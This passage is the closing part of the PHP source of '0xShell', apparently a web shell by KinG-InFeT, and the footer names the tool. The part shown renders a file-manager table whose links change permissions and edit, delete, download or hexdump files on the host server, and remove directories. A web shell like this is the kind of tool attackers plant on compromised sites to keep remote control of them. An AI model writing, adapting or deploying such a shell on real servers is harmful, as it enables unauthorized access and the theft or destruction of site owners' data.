    			. "<td><u><a href=\"?action=chmod&file=".$dir[$i]."&perms=".$perms_num."\">".$perms_unix." - ".$perms_num."</a></u></td>\n"
    			. "<td><a href=\"".$patch."?edit_file=".$dir[$i]."\">Edit</a> - 
    			    <a href=\"".$patch."?remove_file=".$dir[$i]."\">Del</a> - 
    			    <a href=\"".$patch."?download_file=".$dir[$i]."\">Down</a> - 
    			    <a href=\"".$patch."?hexdump_file=".$dir[$i]."\">HEXDUMP</a></td>\n"
    			. "</tr>\n";
        }
	}

    //è una CARTELLA
	if(is_dir($dir[$i])) {
        if (basename($dir[$i]) != '..') {
    		print "<tr><td><a href=\"".$patch."?dir=".$dir[$i]."\">[ ".$dir[$i]." ]</td>\n"
	    		. "<td>DIR</td>\n"
	    		. "<td><u><a href=\"?action=chmod&file=".$dir[$i]."&perms=".$perms_num."\">".$perms_unix." - ".$perms_num."</a></u></td>\n"
	    		. "<td><a href=\"".$patch."?rmdir=".$dir[$i]."\">Del</a>\n"
	    		. "</tr>\n";
        }
    }
}

print "\n</table>";

?>
<br />
<table>
<tr>
<td valign='top'>
<center>
<b><font size='1'>[ ~ Generation time: <?php print round(getTime()-startTime,4); ?> seconds ~ Powered by <a href='http://www.kinginfet.net/'><i>KinG-InFeT</i></a> - <a href="http://0xproject.netsons.org/#0xShell"><u>0xShell</u></a> v<?php print VERSION; ?> ~ ]</b>
</font>
</center>
</td>
</tr>
</table>
</body>
</html>
